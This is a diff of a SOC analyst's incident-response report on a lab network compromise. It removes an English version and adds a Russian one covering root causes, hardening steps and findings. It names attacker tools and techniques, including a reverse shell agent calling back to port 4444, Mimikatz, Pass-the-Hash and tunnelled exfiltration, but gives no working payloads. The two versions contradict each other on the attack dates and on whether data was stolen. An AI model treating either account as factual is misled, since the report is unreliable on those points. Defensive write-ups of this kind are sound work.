-| **`agent_update.exe`** | `C:\Users\student\AppData\Local\Temp\agent_update.exe` | `8f434346648f6b96df89dda901c5176b10e6d0ceec3e463e9a7b57eccb3c42ce` | Reverse Shell / C2 Agent | `10.0.30.12:4444` (TCP) |
-| **`mimi.exe`** | `C:\Users\student\AppData\Local\Temp\mimi.exe` | `a35f5a898dfefda4458f01b1e8a93945c92be2c733367c3b999a0a19d7b4ff44` | Credential Dumper (Mimikatz) | Local execution |
+### 7.2 Архитектурные и конфигурационные недостатки инфраструктуры:
+1. **Критическая уязвимость веб-сервера (`-DBIG_SECURITY_HOLE`):** На публичном сервере развёрнуто уязвимое приложение DVWA, а демон Apache собран из исходников с флагом `-DBIG_SECURITY_HOLE` и запущен **от имени `root`**. Любая загрузка веб-шелла мгновенно давала полный root-доступ к серверу.
+2. **Слабая парольная политика и беспарольный `sudo`:** Пароль `localadmin` на `ws01` оказался словарным, а для пользователя `ubuntu` на `web-server` был разрешён `NOPASSWD: ALL` в `sudoers`.
+3. **Нарушение модели Tiered Administration:** Доменный администратор (`domainadmin`) выполнял интерактивные входы на рядовую рабочую станцию `ws01`, оставив учётные данные в памяти LSASS без защиты `Credential Guard` и `LAPS`.
+4. **Отсутствие межсетевого экранирования DMZ:** Из сегмента DMZ (`10.0.10.5`) были напрямую доступны порты RDP/SMB внутренней сети пользователей (`10.0.30.0/24`) и разрешён TCP-форвардинг в SSH (`AllowTcpForwarding yes`), что позволило пробросить RDP-туннель внутрь периметра.
 
 ---
 
-## ⏱️ 6. Incident Attack Timeline
+## 🛡️ Шаг 8. Рекомендации по устранению и предотвращению (Hardening Roadmap)
 
-| Date & Time (UTC+3) | Affected Asset | Phase | Technical Event Details | Detection Source |
-|:---:|:---:|:---:|:---|:---:|
-| **08.10.2026 14:15:22** | `web_server` | Initial Access | Attacker uploads `system_check.php` to web uploads directory | Nginx `access.log` / Wazuh FIM |
-| **08.10.2026 14:16:04** | `web_server` | Execution | First interactive command execution via Web Shell | Nginx log / PHP-FPM |
-| **08.10.2026 14:35:40** | `web_server` | Discovery | Internal subnet reconnaissance executed from web server | Bash history / Auditd |
-| **08.10.2026 15:35:10** | `ws01` | Lateral Movement | RDP session initiated from `10.0.10.5` using compromised `student` account | Security Event ID 4624 |
-| **08.10.2026 15:42:18** | `ws01` | Defense Evasion | Windows Defender Real-time protection disabled via PowerShell | Defender Event ID 5001 |
-| **08.10.2026 15:48:30** | `ws01` | Persistence | Malicious binary `agent_update.exe` dropped into Temp folder | Sysmon Event ID 11 |
-| **08.10.2026 15:50:02** | `ws01` | Command & Control | Outbound Reverse TCP connection established to `10.0.30.12:4444` | Sysmon Event ID 3 / Netstat |
-| **08.10.2026 16:05:44** | `ws01` | Credential Access | Execution of `mimi.exe` for memory dumping | Sysmon Event ID 1 |
-| **08.10.2026 16:30:00** | `Enterprise` | Containment | Incident Handler isolates `web_server` and `ws01`; C2 session terminated | SOC Active Response |
-
----
-
-## 🛠️ 7. Forensic Tools & Defensive Technologies Utilized
-
-| Tool / Solution | Category | Specific Role in Investigation |
-|:---|:---:|:---|
-| **Wazuh SIEM 4.x** | Defensive (SIEM) | Centralized log ingestion, correlation rules, MITRE ATT&CK mapping, alert triage |
-| **Wazuh FIM** | Defensive (HIDS) | File Integrity Monitoring tracking unauthorized file creation in web roots |
-| **Windows Event Viewer** | Digital Forensics | Deep inspection of `Security.evtx`, `System.evtx`, and `Windows Defender/Operational` |
-| **Microsoft Sysmon** | Digital Forensics | Process execution tracking (Event 1), Network connections (Event 3), File creation (Event 11) |
-| **Linux CLI (`grep`, `awk`)** | Digital Forensics | Rapid parsing of Nginx `access.log`, Linux `auth.log`, and user shell histories |
-| **Wireshark & `ss`** | Network Forensics | Analysis of active TCP sockets and reverse shell communication channels |
+1. **Ликвидация вектора начального проникновения:**
+   - Вывести DVWA из продуктивного контура DMZ.
+   - Переустановить Apache из официальных репозиториев с запуском от непривилегированной сервисной УЗ (`www-data`).
+   - Запретить исполнение скриптов (`php_flag engine off`) в каталогах загрузки файлов и развернуть **WAF (ModSecurity + OWASP CRS)**.
+2. **Управление учётными записями и паролями:**
+   - Ввести политику блокировки УЗ (Account Lockout: 5 неудачных попыток на 30 минут).
+   - Выполнить ротацию паролей всех УЗ (`ubuntu`, `root`, `user`, `localadmin`, `domainuser`, `domainadmin`, `alice`, `MSSQLSvc`) и **дважды сбросить пароль `krbtgt`** для аннулирования возможных Golden Ticket.
+   - Удалить несанкционированный ключ `kali@kali` из `/root/.ssh/authorized_keys` и запретить беспарольный `sudo`.
+3. **Укрепление СЗИ (Endpoint & SIEM):**
+   - Принудительно включить **Tamper Protection** в Microsoft Defender через групповые политики (GPO).
+   - Настроить в Wazuh модуль **Active Response** на критические правила: `60204` (брутфорс), `92652` (Pass-the-Hash), `506` (останов агента), `5001` (отключение AV).
+4. **Сетевая сегментация:**
+   - На межсетевом экране заблокировать любые входящие соединения из сегмента DMZ (`10.0.10.0/24`) в сегменты `10.0.20.0/24` (Servers) и `10.0.30.0/24` (Users) по портам `445/SMB` и `3389/RDP`.
+   - В конфигурации `/etc/ssh/sshd_config` на `web-server` установить `AllowTcpForwarding no` и `PermitRootLogin no`.
+5. **Защита Active Directory:**
+   - Внедрить модель разделения привилегий (**Tier 0 / Tier 1 / Tier 2**): запретить вход учётной записи `domainadmin` на пользовательские рабочие станции через GPO (`Deny log on through Remote Desktop Services`).
+   - Развернуть **Microsoft LAPS** и включить **Windows Defender Credential Guard** для защиты процесса `LSASS`.
 
 ---
 
-## 🔍 8. Root Cause Analysis (RCA)
+## 🏁 Шаг 9. Итоговый вывод для руководства
 
-### 8.1 Infrastructure Architectural Deficiencies:
-1. **Flawed DMZ Segmentation:** The DMZ web server (`10.0.10.5`) possessed unrestricted Layer 3/4 network reachability into the internal client subnet (`10.0.30.0/24`). Compromise of the perimeter host immediately allowed direct pivot to internal workstations.
-2. **Password Reuse & Shared Credentials:** Local administrator credentials (`student`) were identical across both Linux and Windows environments, enabling frictionless lateral movement.
-3. **Insecure Application File Uploads:** Web application lacked file extension validation, MIME-type verification, and stored uploads inside an executable web directory.
+В период с **18.04.2023 по 19.04.2023** инфраструктура компании подверглась целенаправленной многоэтапной кибератаке. 
 
-### 8.2 Security Control Deficiencies:
-1. **Absence of Tamper Protection:** Windows Defender allowed local administrative processes to disable real-time AV scanning without cloud/GPO validation.
-2. **Unrestricted Executable Directories:** Absence of **Software Restriction Policies (AppLocker / WDAC)** allowed execution of portable executables (`.exe`) directly from writable user directories (`C:\Users\...\AppData\Local\Temp`).
-3. **Passive SIEM Alerting:** SIEM successfully triggered high-severity alerts upon AV termination, but lacked automated active containment rules (e.g., host isolation).
+- **Факт компрометации инфраструктуры:** **ДОКАЗАН В ПОЛНОМ ОБЪЁМЕ.** Злоумышленник (действовавший с хоста `10.0.10.254`) скомпрометировал веб-сервер DMZ, через SSH-туннель подобрал пароль к рабочей станции `ws01`, отключил антивирусную защиту Microsoft Defender, извлёк доменные учётные данные и методом Pass-the-Hash захватил контроллер домена `dc01` (`acme.skb`).
+- **Факт утечки конфиденциальных данных:** **ДОКАЗАН.** Криминалистическая экспертиза подтвердила несанкционированный доступ атакующего к секретному документу `C:\Users\domainadmin\Desktop\TOP SECRET!.txt` (94 048 байт) на контроллере домена, очистку корзины для сокрытия следов и кражу теневого файла паролей `/etc/shadow` с веб-сервера. Эксфильтрация осуществлялась через проброшенный в RDP-сессии дисковый ресурс `\\tsclient` по SSH-туннелю.
+
+Несмотря на попытку атакующего скрыть следы путём удаления эксплойтов и остановки агента Wazuh в `22:32:56`, сохранённые журналы виртуального хоста Apache, телеметрия Microsoft Defender, дампы аварийных сбоев `WER AppCrash` и база событий Wazuh SIEM позволили посекундно реконструировать всю цепочку атаки.
 
 ---
 
-## 🛡️ 9. Comprehensive Remediation & Hardening Roadmap
-
-### 9.1 Immediate Containment Actions (0 – 24 Hours):
-- [x] Sever network access for `web_server` (10.0.10.5) and `ws01` (10.0.30.53) via router access-lists.
-- [x] Invalidate and rotate all domain and local administrative passwords.
-- [x] Terminate active reverse shell process (`PID` associated with `agent_update.exe`) and purge malicious files (`system_check.php`, `agent_update.exe`, `mimi.exe`).
-
-### 9.2 Short-Term Technical Hardening (1 – 14 Days):
-- **Enforce Tamper Protection:** Deploy Group Policy enforcing Windows Defender Tamper Protection, preventing registry or PowerShell modifications to security services.
-- **Implement Microsoft LAPS:** Deploy Local Administrator Password Solution across all domain-joined Windows machines to eliminate local password reuse.
-- **Hardened Web Uploads:** Reconfigure Nginx to disable script execution in upload directories:
-  ```nginx
-  location /uploads/ {
-      types { }
-      default_type text/plain;
-      php_flag engine off;
-  }
-  ```
-- **AppLocker Execution Policies:** Implement AppLocker rules blocking executable binaries in user-writable paths (`%TEMP%`, `%APPDATA%`, `%USERPROFILE%\Downloads`).
-
-### 9.3 Long-Term Strategic Hardening (15 – 60 Days):
-- **Micro-Segmentation & Zero Trust:** Reconfigure gateway `vy` with strict stateful firewall policies: DMZ servers may only respond to external requests and may **never** initiate inbound connections to client or domain subnets.
-- **Wazuh Active Response:** Enable automated active response playbooks: automatically isolate any Windows workstation reporting Defender disablement (Event 5001) or Mimikatz execution.
-- **Centralized Sysmon & Audit Logging:** Standardize Sysmon configuration (SwiftOnSecurity profile) across all endpoints with centralized log shipping to Wazuh/ELK.
-
----
-
-## 🏁 10. Final Assessment & Verdict
-
-1. **Compromise Status:** **CONFIRMED & REMEDIATED.** The corporate network was penetrated via a web application vulnerability, resulting in lateral movement and host compromise. The threat was successfully identified, analyzed, and contained.
-2. **Data Leakage Status:** **NEGATIVE (No Exfiltration Detected).** Detailed forensic examination of network traffic, file modification timestamps, and command histories confirms that sensitive business databases and customer data were not exfiltrated.
-3. **Posture Impact:** Implementation of the remediation roadmap mitigates the identified attack vectors, elevating corporate posture against advanced threat actors.
-
----
-
-*Report authored by **Aleksei Zharkou** &bull; Blue Team / SOC Analyst &bull; [LinkedIn](https://www.linkedin.com/in/aleksei-zharkou/) &bull; [GitHub Portfolio](https://github.com/Voobrazhenie21-lab)*
+*Отчёт подготовил: **Алексей Жарков** &bull; Специалист по информационной безопасности (Blue Team / SOC / Pentest) &bull; [LinkedIn](https://www.linkedin.com/in/aleksei-zharkou/) &bull; [GitHub](https://github.com/Voobrazhenie21-lab)*
